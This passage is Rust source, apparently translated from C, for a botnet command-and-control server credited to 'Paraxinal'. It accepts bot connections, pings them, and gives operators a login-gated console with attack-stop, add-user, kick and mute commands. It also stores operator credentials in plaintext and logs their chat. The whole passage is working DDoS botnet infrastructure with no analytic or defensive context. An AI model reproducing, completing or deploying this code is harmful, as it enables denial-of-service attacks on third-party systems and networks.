                                        strlen(ddosline1.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    if send(
                                        datafd,
                                        ddosline2.as_mut_ptr() as *const libc::c_void,
                                        strlen(ddosline2.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    if send(
                                        datafd,
                                        ddosline3.as_mut_ptr() as *const libc::c_void,
                                        strlen(ddosline3.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    if send(
                                        datafd,
                                        ddosline4.as_mut_ptr() as *const libc::c_void,
                                        strlen(ddosline4.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    if send(
                                        datafd,
                                        ddosline5.as_mut_ptr() as *const libc::c_void,
                                        strlen(ddosline5.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    if send(
                                        datafd,
                                        ddosline6.as_mut_ptr() as *const libc::c_void,
                                        strlen(ddosline6.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    if send(
                                        datafd,
                                        ddosline7.as_mut_ptr() as *const libc::c_void,
                                        strlen(ddosline7.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    if send(
                                        datafd,
                                        ddosline8.as_mut_ptr() as *const libc::c_void,
                                        strlen(ddosline8.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    if send(
                                        datafd,
                                        ddosline9.as_mut_ptr() as *const libc::c_void,
                                        strlen(ddosline9.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    if send(
                                        datafd,
                                        ddosline10.as_mut_ptr() as *const libc::c_void,
                                        strlen(ddosline10.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    if send(
                                        datafd,
                                        ddosline11.as_mut_ptr() as *const libc::c_void,
                                        strlen(ddosline11.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    if send(
                                        datafd,
                                        ddosline12.as_mut_ptr() as *const libc::c_void,
                                        strlen(ddosline12.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                } else if !(strstr(
                                    buf.as_mut_ptr(),
                                    b"!* unmute\0" as *const u8 as *const libc::c_char,
                                ))
                                    .is_null()
                                    || !(strstr(
                                        buf.as_mut_ptr(),
                                        b"UNMUTE\0" as *const u8 as *const libc::c_char,
                                    ))
                                        .is_null()
                                {
                                    if managements[datafd as usize].mute == 1 as libc::c_int {
                                        managements[datafd as usize].mute = 0 as libc::c_int;
                                        sprintf(
                                            botnet.as_mut_ptr(),
                                            b"\x1B[32mMute Disabled!\x1B[37m\r\n\0" as *const u8
                                                as *const libc::c_char,
                                        );
                                        if send(
                                            datafd,
                                            botnet.as_mut_ptr() as *const libc::c_void,
                                            strlen(botnet.as_mut_ptr()),
                                            MSG_NOSIGNAL as libc::c_int,
                                        ) == -(1 as libc::c_int) as libc::c_long
                                        {
                                            return;
                                        }
                                    } else {
                                        sprintf(
                                            botnet.as_mut_ptr(),
                                            b"\x1B[31mError, Mute is Already Disabled.\x1B[37m\r\n\0"
                                                as *const u8 as *const libc::c_char,
                                        );
                                        if send(
                                            datafd,
                                            botnet.as_mut_ptr() as *const libc::c_void,
                                            strlen(botnet.as_mut_ptr()),
                                            MSG_NOSIGNAL as libc::c_int,
                                        ) == -(1 as libc::c_int) as libc::c_long
                                        {
                                            return;
                                        }
                                    }
                                } else if !(strstr(
                                    buf.as_mut_ptr(),
                                    b"!* mute\0" as *const u8 as *const libc::c_char,
                                ))
                                    .is_null()
                                    || !(strstr(
                                        buf.as_mut_ptr(),
                                        b"!* MUTE\0" as *const u8 as *const libc::c_char,
                                    ))
                                        .is_null()
                                {
                                    if managements[datafd as usize].mute == 0 as libc::c_int {
                                        managements[datafd as usize].mute = 1 as libc::c_int;
                                        sprintf(
                                            botnet.as_mut_ptr(),
                                            b"\x1B[32mMute Enabled!\x1B[37m\r\n\0" as *const u8
                                                as *const libc::c_char,
                                        );
                                        if send(
                                            datafd,
                                            botnet.as_mut_ptr() as *const libc::c_void,
                                            strlen(botnet.as_mut_ptr()),
                                            MSG_NOSIGNAL as libc::c_int,
                                        ) == -(1 as libc::c_int) as libc::c_long
                                        {
                                            return;
                                        }
                                    } else {
                                        sprintf(
                                            botnet.as_mut_ptr(),
                                            b"\x1B[31mError, Mute is Already Enabled.\x1B[37m\r\n\0"
                                                as *const u8 as *const libc::c_char,
                                        );
                                        if send(
                                            datafd,
                                            botnet.as_mut_ptr() as *const libc::c_void,
                                            strlen(botnet.as_mut_ptr()),
                                            MSG_NOSIGNAL as libc::c_int,
                                        ) == -(1 as libc::c_int) as libc::c_long
                                        {
                                            return;
                                        }
                                    }
                                }
                                if !(strstr(
                                    buf.as_mut_ptr(),
                                    b"!* kill\0" as *const u8 as *const libc::c_char,
                                ))
                                    .is_null()
                                {
                                    let mut killattack: [libc::c_char; 2048] = [0; 2048];
                                    memset(
                                        killattack.as_mut_ptr() as *mut libc::c_void,
                                        0 as libc::c_int,
                                        2048 as libc::c_int as libc::c_ulong,
                                    );
                                    sprintf(
                                        killattack.as_mut_ptr(),
                                        b"Succesfully Stopped Attack!\r\n\0" as *const u8
                                            as *const libc::c_char,
                                    );
                                    if send(
                                        datafd,
                                        killattack.as_mut_ptr() as *const libc::c_void,
                                        strlen(killattack.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                } else if !(strstr(
                                    buf.as_mut_ptr(),
                                    b"adduser\0" as *const u8 as *const libc::c_char,
                                ))
                                    .is_null()
                                    || !(strstr(
                                        buf.as_mut_ptr(),
                                        b"ADDUSER\0" as *const u8 as *const libc::c_char,
                                    ))
                                        .is_null()
                                {
                                    if strcmp(
                                        (managements[datafd as usize].username).as_mut_ptr(),
                                        b"Freak\0" as *const u8 as *const libc::c_char,
                                    ) == 0
                                    {
                                        'c_7487: loop {
                                            memset(
                                                auresp.as_mut_ptr() as *mut libc::c_void,
                                                0 as libc::c_int,
                                                ::std::mem::size_of::<[libc::c_char; 1024]>()
                                                    as libc::c_ulong,
                                            );
                                            memset(
                                                new_username.as_mut_ptr() as *mut libc::c_void,
                                                0 as libc::c_int,
                                                ::std::mem::size_of::<[libc::c_char; 40]>() as libc::c_ulong,
                                            );
                                            memset(
                                                new_password.as_mut_ptr() as *mut libc::c_void,
                                                0 as libc::c_int,
                                                ::std::mem::size_of::<[libc::c_char; 40]>() as libc::c_ulong,
                                            );
                                            sprintf(
                                                auresp.as_mut_ptr(),
                                                b"\x1B[39mEnter new unsername\x1B[35m: \x1B[37m\0"
                                                    as *const u8 as *const libc::c_char,
                                            );
                                            if send(
                                                datafd,
                                                auresp.as_mut_ptr() as *const libc::c_void,
                                                strlen(auresp.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                break 's_298;
                                            }
                                            memset(
                                                auresp.as_mut_ptr() as *mut libc::c_void,
                                                0 as libc::c_int,
                                                ::std::mem::size_of::<[libc::c_char; 1024]>()
                                                    as libc::c_ulong,
                                            );
                                            fdgets(
                                                new_username.as_mut_ptr() as *mut libc::c_uchar,
                                                ::std::mem::size_of::<[libc::c_char; 40]>() as libc::c_ulong
                                                    as libc::c_int,
                                                datafd,
                                            ) > 0 as libc::c_int;
                                            trim(new_username.as_mut_ptr());
                                            ok = 0;
                                            ok = 0 as libc::c_int;
                                            loop {
                                                if !(ok < 100000 as libc::c_int) {
                                                    break 'c_7487;
                                                }
                                                if strcmp(
                                                    (accounts[ok as usize].username).as_mut_ptr(),
                                                    new_username.as_mut_ptr(),
                                                ) == 0
                                                {
                                                    snprintf(
                                                        auresp.as_mut_ptr(),
                                                        ::std::mem::size_of::<[libc::c_char; 1024]>()
                                                            as libc::c_ulong,
                                                        b"\x1B[31mSorry\x1B[32m,\x1B[31mThe username (\x1B[33m%s\x1B[31m) is taken already\x1B[37m...\r\n\0"
                                                            as *const u8 as *const libc::c_char,
                                                        new_username.as_mut_ptr(),
                                                    );
                                                    if send(
                                                        datafd,
                                                        auresp.as_mut_ptr() as *const libc::c_void,
                                                        strlen(auresp.as_mut_ptr()),
                                                        MSG_NOSIGNAL as libc::c_int,
                                                    ) == -(1 as libc::c_int) as libc::c_long
                                                    {
                                                        break 's_298;
                                                    }
                                                    memset(
                                                        new_username.as_mut_ptr() as *mut libc::c_void,
                                                        0 as libc::c_int,
                                                        ::std::mem::size_of::<[libc::c_char; 40]>() as libc::c_ulong,
                                                    );
                                                    break;
                                                } else {
                                                    ok += 1;
                                                }
                                            }
                                        }
                                        memset(
                                            auresp.as_mut_ptr() as *mut libc::c_void,
                                            0 as libc::c_int,
                                            ::std::mem::size_of::<[libc::c_char; 1024]>()
                                                as libc::c_ulong,
                                        );
                                        sprintf(
                                            auresp.as_mut_ptr(),
                                            b"\x1B[39mEnter new password\x1B[35m: \x1B[37m\0"
                                                as *const u8 as *const libc::c_char,
                                        );
                                        if send(
                                            datafd,
                                            auresp.as_mut_ptr() as *const libc::c_void,
                                            strlen(auresp.as_mut_ptr()),
                                            MSG_NOSIGNAL as libc::c_int,
                                        ) == -(1 as libc::c_int) as libc::c_long
                                        {
                                            break;
                                        }
                                        memset(
                                            auresp.as_mut_ptr() as *mut libc::c_void,
                                            0 as libc::c_int,
                                            ::std::mem::size_of::<[libc::c_char; 1024]>()
                                                as libc::c_ulong,
                                        );
                                        fdgets(
                                            new_password.as_mut_ptr() as *mut libc::c_uchar,
                                            ::std::mem::size_of::<[libc::c_char; 40]>() as libc::c_ulong
                                                as libc::c_int,
                                            datafd,
                                        ) > 0 as libc::c_int;
                                        trim(new_password.as_mut_ptr());
                                        let mut auf: *mut FILE = fopen(
                                            b"login.txt\0" as *const u8 as *const libc::c_char,
                                            b"a\0" as *const u8 as *const libc::c_char,
                                        );
                                        fprintf(
                                            auf,
                                            b"%s %s\n\0" as *const u8 as *const libc::c_char,
                                            new_username.as_mut_ptr(),
                                            new_password.as_mut_ptr(),
                                        );
                                        fclose(auf);
                                        snprintf(
                                            auresp.as_mut_ptr(),
                                            ::std::mem::size_of::<[libc::c_char; 1024]>()
                                                as libc::c_ulong,
                                            b"\x1B[39mAccount \x1B[33m%s\x1B[39m added\x1B[32m!\x1B[37m\r\n\0"
                                                as *const u8 as *const libc::c_char,
                                            new_username.as_mut_ptr(),
                                        );
                                        if send(
                                            datafd,
                                            auresp.as_mut_ptr() as *const libc::c_void,
                                            strlen(auresp.as_mut_ptr()),
                                            MSG_NOSIGNAL as libc::c_int,
                                        ) == -(1 as libc::c_int) as libc::c_long
                                        {
                                            break;
                                        }
                                        memset(
                                            auresp.as_mut_ptr() as *mut libc::c_void,
                                            0 as libc::c_int,
                                            ::std::mem::size_of::<[libc::c_char; 1024]>()
                                                as libc::c_ulong,
                                        );
                                        memset(
                                            new_username.as_mut_ptr() as *mut libc::c_void,
                                            0 as libc::c_int,
                                            ::std::mem::size_of::<[libc::c_char; 40]>() as libc::c_ulong,
                                        );
                                        memset(
                                            new_password.as_mut_ptr() as *mut libc::c_void,
                                            0 as libc::c_int,
                                            ::std::mem::size_of::<[libc::c_char; 40]>() as libc::c_ulong,
                                        );
                                    } else {
                                        let mut failed_msg: [libc::c_char; 150] = [0; 150];
                                        snprintf(
                                            failed_msg.as_mut_ptr(),
                                            ::std::mem::size_of::<[libc::c_char; 150]>()
                                                as libc::c_ulong,
                                            b"Sorry %s, only the owner can use this function...\r\n\0"
                                                as *const u8 as *const libc::c_char,
                                            (managements[datafd as usize].username).as_mut_ptr(),
                                        );
                                        if send(
                                            datafd,
                                            failed_msg.as_mut_ptr() as *const libc::c_void,
                                            strlen(failed_msg.as_mut_ptr()),
                                            MSG_NOSIGNAL as libc::c_int,
                                        ) == -(1 as libc::c_int) as libc::c_long
                                        {
                                            return;
                                        }
                                        memset(
                                            failed_msg.as_mut_ptr() as *mut libc::c_void,
                                            0 as libc::c_int,
                                            ::std::mem::size_of::<[libc::c_char; 150]>()
                                                as libc::c_ulong,
                                        );
                                    }
                                } else if !(strstr(
                                    buf.as_mut_ptr(),
                                    b"kick \0" as *const u8 as *const libc::c_char,
                                ))
                                    .is_null()
                                {
                                    if strcmp(
                                        (managements[datafd as usize].username).as_mut_ptr(),
                                        b"Freak\0" as *const u8 as *const libc::c_char,
                                    ) == 0
                                    {
                                        trim(buf.as_mut_ptr());
                                        let mut nick: *mut libc::c_char = buf
                                            .as_mut_ptr()
                                            .offset(5 as libc::c_int as isize);
                                        let mut x: libc::c_int = 0;
                                        x = 0 as libc::c_int;
                                        while x < 100000 as libc::c_int {
                                            if strcmp(
                                                (managements[x as usize].username).as_mut_ptr(),
                                                nick,
                                            ) == 0
                                            {
                                                let mut kick_msg: [libc::c_char; 200] = [0; 200];
                                                let mut kick_msg2: [libc::c_char; 200] = [0; 200];
                                                snprintf(
                                                    kick_msg.as_mut_ptr(),
                                                    ::std::mem::size_of::<[libc::c_char; 200]>()
                                                        as libc::c_ulong,
                                                    b"\r\n\x1B[37m%s\x1B[37m you have been kicked by \x1B[37m%s\x1B[37m, Goodbye.\x1B[95m\r\n\0"
                                                        as *const u8 as *const libc::c_char,
                                                    (managements[x as usize].username).as_mut_ptr(),
                                                    (managements[datafd as usize].username).as_mut_ptr(),
                                                );
                                                snprintf(
                                                    kick_msg2.as_mut_ptr(),
                                                    ::std::mem::size_of::<[libc::c_char; 200]>()
                                                        as libc::c_ulong,
                                                    b"\x1B[37mYou kicked \x1B[37m%s\x1B[37m...\r\n\0"
                                                        as *const u8 as *const libc::c_char,
                                                    (managements[x as usize].username).as_mut_ptr(),
                                                );
                                                if send(
                                                    datafd,
                                                    kick_msg2.as_mut_ptr() as *const libc::c_void,
                                                    strlen(kick_msg2.as_mut_ptr()),
                                                    MSG_NOSIGNAL as libc::c_int,
                                                ) == -(1 as libc::c_int) as libc::c_long
                                                {
                                                    return;
                                                }
                                                if send(
                                                    x,
                                                    kick_msg.as_mut_ptr() as *const libc::c_void,
                                                    strlen(kick_msg.as_mut_ptr()),
                                                    MSG_NOSIGNAL as libc::c_int,
                                                ) == -(1 as libc::c_int) as libc::c_long
                                                {
                                                    return;
                                                }
                                                managements[x as usize].connected = 0 as libc::c_int;
                                                close(x);
                                                memset(
                                                    (managements[x as usize].username).as_mut_ptr()
                                                        as *mut libc::c_void,
                                                    0 as libc::c_int,
                                                    ::std::mem::size_of::<[libc::c_char; 50]>() as libc::c_ulong,
                                                );
                                                memset(
                                                    kick_msg.as_mut_ptr() as *mut libc::c_void,
                                                    0 as libc::c_int,
                                                    ::std::mem::size_of::<[libc::c_char; 200]>()
                                                        as libc::c_ulong,
                                                );
                                                memset(
                                                    kick_msg2.as_mut_ptr() as *mut libc::c_void,
                                                    0 as libc::c_int,
                                                    ::std::mem::size_of::<[libc::c_char; 200]>()
                                                        as libc::c_ulong,
                                                );
                                            }
                                            x += 1;
                                        }
                                    } else {
                                        let mut failed_msg_0: [libc::c_char; 150] = [0; 150];
                                        snprintf(
                                            failed_msg_0.as_mut_ptr(),
                                            ::std::mem::size_of::<[libc::c_char; 150]>()
                                                as libc::c_ulong,
                                            b"Sorry %s, only the owner can use this function...\r\n\0"
                                                as *const u8 as *const libc::c_char,
                                            (managements[datafd as usize].username).as_mut_ptr(),
                                        );
                                        if send(
                                            datafd,
                                            failed_msg_0.as_mut_ptr() as *const libc::c_void,
                                            strlen(failed_msg_0.as_mut_ptr()),
                                            MSG_NOSIGNAL as libc::c_int,
                                        ) == -(1 as libc::c_int) as libc::c_long
                                        {
                                            return;
                                        }
                                        memset(
                                            failed_msg_0.as_mut_ptr() as *mut libc::c_void,
                                            0 as libc::c_int,
                                            ::std::mem::size_of::<[libc::c_char; 150]>()
                                                as libc::c_ulong,
                                        );
                                    }
                                    memset(
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        0 as libc::c_int,
                                        ::std::mem::size_of::<[libc::c_char; 2048]>()
                                            as libc::c_ulong,
                                    );
                                } else if !(strstr(
                                    buf.as_mut_ptr(),
                                    b"CLEARSCREEN\0" as *const u8 as *const libc::c_char,
                                ))
                                    .is_null()
                                    || !(strstr(
                                        buf.as_mut_ptr(),
                                        b"CLEAR\0" as *const u8 as *const libc::c_char,
                                    ))
                                        .is_null()
                                    || !(strstr(
                                        buf.as_mut_ptr(),
                                        b"clear\0" as *const u8 as *const libc::c_char,
                                    ))
                                        .is_null()
                                    || !(strstr(
                                        buf.as_mut_ptr(),
                                        b"cls\0" as *const u8 as *const libc::c_char,
                                    ))
                                        .is_null()
                                {
                                    let mut clearscreen: [libc::c_char; 2048] = [0; 2048];
                                    memset(
                                        clearscreen.as_mut_ptr() as *mut libc::c_void,
                                        0 as libc::c_int,
                                        2048 as libc::c_int as libc::c_ulong,
                                    );
                                    sprintf(
                                        clearscreen.as_mut_ptr(),
                                        b"\x1B[2J\x1B[1;1H\0" as *const u8 as *const libc::c_char,
                                    );
                                    if send(
                                        datafd,
                                        clearscreen.as_mut_ptr() as *const libc::c_void,
                                        strlen(clearscreen.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                }
                                if !(strstr(
                                    buf.as_mut_ptr(),
                                    b"LOGOUT\0" as *const u8 as *const libc::c_char,
                                ))
                                    .is_null()
                                {
                                    let mut logoutmessage: [libc::c_char; 2048] = [0; 2048];
                                    memset(
                                        logoutmessage.as_mut_ptr() as *mut libc::c_void,
                                        0 as libc::c_int,
                                        2048 as libc::c_int as libc::c_ulong,
                                    );
                                    sprintf(
                                        logoutmessage.as_mut_ptr(),
                                        b"Redirecting..., %s\0" as *const u8 as *const libc::c_char,
                                        (accounts[find_line as usize].username).as_mut_ptr(),
                                    );
                                    if send(
                                        datafd,
                                        logoutmessage.as_mut_ptr() as *const libc::c_void,
                                        strlen(logoutmessage.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    sleep(5 as libc::c_int as libc::c_uint);
                                    break;
                                } else {
                                    trim(buf.as_mut_ptr());
                                    if send(
                                        datafd,
                                        (managements[datafd as usize].userprompt).as_mut_ptr()
                                            as *const libc::c_void,
                                        strlen(
                                            (managements[datafd as usize].userprompt).as_mut_ptr(),
                                        ),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        break;
                                    }
                                    broadcast(
                                        buf.as_mut_ptr(),
                                        datafd,
                                        (managements[datafd as usize].username).as_mut_ptr(),
                                    );
                                    printf(
                                        b"%s: \"%s\"\n\0" as *const u8 as *const libc::c_char,
                                        (managements[datafd as usize].username).as_mut_ptr(),
                                        buf.as_mut_ptr(),
                                    );
                                    let mut LogFile: *mut FILE = 0 as *mut FILE;
                                    LogFile = fopen(
                                        b"server_log.txt\0" as *const u8 as *const libc::c_char,
                                        b"a\0" as *const u8 as *const libc::c_char,
                                    );
                                    let mut now: time_t = 0;
                                    let mut gmt: *mut tm = 0 as *mut tm;
                                    let mut formatted_gmt: [libc::c_char; 50] = [0; 50];
                                    let mut lcltime: [libc::c_char; 50] = [0; 50];
                                    now = time(0 as *mut time_t);
                                    gmt = gmtime(&mut now);
                                    strftime(
                                        formatted_gmt.as_mut_ptr(),
                                        ::std::mem::size_of::<[libc::c_char; 50]>()
                                            as libc::c_ulong,
                                        b"%I:%M %p\0" as *const u8 as *const libc::c_char,
                                        gmt,
                                    );
                                    fprintf(
                                        LogFile,
                                        b"[%s] %s: %s\n\0" as *const u8 as *const libc::c_char,
                                        formatted_gmt.as_mut_ptr(),
                                        (managements[datafd as usize].username).as_mut_ptr(),
                                        buf.as_mut_ptr(),
                                    );
                                    fclose(LogFile);
                                    memset(
                                        buf.as_mut_ptr() as *mut libc::c_void,
                                        0 as libc::c_int,
                                        ::std::mem::size_of::<[libc::c_char; 2048]>()
                                            as libc::c_ulong,
                                    );
                                }
                            }
                            current_block = 5005401933950163426;
                        }
                    }
                }
            } else {
                current_block = 340123238355120661;
            }
            match current_block {
                5005401933950163426 => {}
                _ => {
                    if !(send(
                        datafd,
                        b"\x1B[1A\0" as *const u8 as *const libc::c_char
                            as *const libc::c_void,
                        5 as libc::c_int as size_t,
                        MSG_NOSIGNAL as libc::c_int,
                    ) == -(1 as libc::c_int) as libc::c_long)
                    {
                        failed_line1 = [0; 80];
                        sprintf(
                            failed_line1.as_mut_ptr(),
                            b"\x1B[105m            Invalid Login!        \r\n\0"
                                as *const u8 as *const libc::c_char,
                        );
                        if !(send(
                            datafd,
                            failed_line1.as_mut_ptr() as *const libc::c_void,
                            strlen(failed_line1.as_mut_ptr()),
                            MSG_NOSIGNAL as libc::c_int,
                        ) == -(1 as libc::c_int) as libc::c_long)
                        {
                            sleep(5 as libc::c_int as libc::c_uint);
                        }
                    }
                }
            }
        }
    }
    managements[datafd as usize].connected = 0 as libc::c_int;
    close(datafd);
    ::std::ptr::write_volatile(
        &mut OperatorsConnected as *mut libc::c_int,
        ::std::ptr::read_volatile::<
            libc::c_int,
        >(&OperatorsConnected as *const libc::c_int) - 1,
    );
    memset(
        (managements[datafd as usize].username).as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        ::std::mem::size_of::<[libc::c_char; 50]>() as libc::c_ulong,
    );
    memset(
        buf.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        ::std::mem::size_of::<[libc::c_char; 2048]>() as libc::c_ulong,
    );
}
#[no_mangle]
pub unsafe extern "C" fn BotListener(mut port: libc::c_int) -> *mut libc::c_void {
    let mut sockfd: libc::c_int = 0;
    let mut newsockfd: libc::c_int = 0;
    let mut clilen: socklen_t = 0;
    let mut serv_addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    let mut cli_addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    sockfd = socket(2 as libc::c_int, SOCK_STREAM as libc::c_int, 0 as libc::c_int);
    if sockfd < 0 as libc::c_int {
        perror(b"ERROR opening socket\0" as *const u8 as *const libc::c_char);
    }
    bzero(
        &mut serv_addr as *mut sockaddr_in as *mut libc::c_char as *mut libc::c_void,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong,
    );
    serv_addr.sin_family = 2 as libc::c_int as sa_family_t;
    serv_addr.sin_addr.s_addr = 0 as libc::c_int as in_addr_t;
    serv_addr.sin_port = htons(port as uint16_t);
    if bind(
        sockfd,
        &mut serv_addr as *mut sockaddr_in as *mut sockaddr,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
    ) < 0 as libc::c_int
    {
        perror(b"ERROR on binding\0" as *const u8 as *const libc::c_char);
    }
    listen(sockfd, 5 as libc::c_int);
    clilen = ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t;
    loop {
        newsockfd = accept(
            sockfd,
            &mut cli_addr as *mut sockaddr_in as *mut sockaddr,
            &mut clilen,
        );
        if newsockfd < 0 as libc::c_int {
            perror(b"ERROR on accept\0" as *const u8 as *const libc::c_char);
        }
        let mut thread: pthread_t = 0;
        let mut args: kekl = kekl {
            sock: 0,
            ip: 0,
            cli_addr: sockaddr_in {
                sin_family: 0,
                sin_port: 0,
                sin_addr: in_addr { s_addr: 0 },
                sin_zero: [0; 8],
            },
        };
        args.sock = newsockfd;
        args.ip = (*(&mut cli_addr as *mut sockaddr_in)).sin_addr.s_addr;
        pthread_create(
            &mut thread,
            0 as *const pthread_attr_t,
            ::std::mem::transmute::<
                Option::<unsafe extern "C" fn(*mut libc::c_void) -> ()>,
                Option::<unsafe extern "C" fn(*mut libc::c_void) -> *mut libc::c_void>,
            >(Some(BotWorker as unsafe extern "C" fn(*mut libc::c_void) -> ())),
            &mut args as *mut kekl as *mut libc::c_void,
        );
    };
}
unsafe fn main_0(
    mut argc: libc::c_int,
    mut argv: *mut *mut libc::c_char,
) -> libc::c_int {
    signal(
        13 as libc::c_int,
        ::std::mem::transmute::<
            libc::intptr_t,
            __sighandler_t,
        >(1 as libc::c_int as libc::intptr_t),
    );
    let mut s: libc::c_int = 0;
    let mut threads: libc::c_int = 0;
    let mut port: libc::c_int = 0;
    let mut event: epoll_event = epoll_event {
        events: 0,
        data: epoll_data {
            ptr: 0 as *mut libc::c_void,
        },
    };
    if argc != 4 as libc::c_int {
        fprintf(
            stderr,
            b"Usage: %s [Bot-Port] [Threads] [Cnc-Port]\n\0" as *const u8
                as *const libc::c_char,
            *argv.offset(0 as libc::c_int as isize),
        );
        exit(1 as libc::c_int);
    }
    port = atoi(*argv.offset(3 as libc::c_int as isize));
    printf(b"Botnet Screened!\n\0" as *const u8 as *const libc::c_char);
    printf(
        b"\x1B[31mCreated by Paraxinal\x1B[1;37m\n\0" as *const u8 as *const libc::c_char,
    );
    telFD = fopen(
        b"telnet.txt\0" as *const u8 as *const libc::c_char,
        b"a+\0" as *const u8 as *const libc::c_char,
    ) as *mut FILE;
    threads = atoi(*argv.offset(2 as libc::c_int as isize));
    ::std::ptr::write_volatile(
        &mut listenFD as *mut libc::c_int,
        create_and_bind(*argv.offset(1 as libc::c_int as isize)),
    );
    if listenFD == -(1 as libc::c_int) {
        abort();
    }
    s = make_socket_non_blocking(listenFD);
    if s == -(1 as libc::c_int) {
        abort();
    }
    s = listen(listenFD, 128 as libc::c_int);
    if s == -(1 as libc::c_int) {
        perror(b"listen\0" as *const u8 as *const libc::c_char);
        abort();
    }
    ::std::ptr::write_volatile(
        &mut epollFD as *mut libc::c_int,
        epoll_create1(0 as libc::c_int),
    );
    if epollFD == -(1 as libc::c_int) {
        perror(b"epoll_create\0" as *const u8 as *const libc::c_char);
        abort();
    }
    event.data.fd = listenFD;
    event.events = EPOLLIN as libc::c_int as libc::c_uint | EPOLLET as libc::c_uint;
    s = epoll_ctl(epollFD, 1 as libc::c_int, listenFD, &mut event);
    if s == -(1 as libc::c_int) {
        perror(b"epoll_ctl\0" as *const u8 as *const libc::c_char);
        abort();
    }
    let vla = (threads + 2 as libc::c_int) as usize;
    let mut thread: Vec::<pthread_t> = ::std::vec::from_elem(0, vla);
    loop {
        let fresh0 = threads;
        threads = threads - 1;
        if !(fresh0 != 0) {
            break;
        }
        pthread_create(
            &mut *thread.as_mut_ptr().offset((threads + 1 as libc::c_int) as isize),
            0 as *const pthread_attr_t,
            Some(
                BotEventLoop
                    as unsafe extern "C" fn(*mut libc::c_void) -> *mut libc::c_void,
            ),
            0 as *mut libc::c_void,
        );
    }
    pthread_create(
        &mut *thread.as_mut_ptr().offset(0 as libc::c_int as isize),
        0 as *const pthread_attr_t,
        ::std::mem::transmute::<
            Option::<unsafe extern "C" fn(libc::c_int) -> *mut libc::c_void>,
            Option::<unsafe extern "C" fn(*mut libc::c_void) -> *mut libc::c_void>,
        >(Some(BotListener as unsafe extern "C" fn(libc::c_int) -> *mut libc::c_void)),
        port as *mut libc::c_void,
    );
    loop {
        broadcast(
            b"PING\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
            -(1 as libc::c_int),
            b"ZERO\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
        );
        sleep(60 as libc::c_int as libc::c_uint);
    };
}
pub fn main() {
    let mut args: Vec::<*mut libc::c_char> = Vec::new();
    for arg in ::std::env::args() {
        args.push(
            (::std::ffi::CString::new(arg))
                .expect("Failed to convert argument into CString.")
                .into_raw(),
        );
    }
    args.push(::std::ptr::null_mut());
    unsafe {
        ::std::process::exit(
            main_0(
                (args.len() - 1) as libc::c_int,
                args.as_mut_ptr() as *mut *mut libc::c_char,
            ) as i32,
        )
    }
}

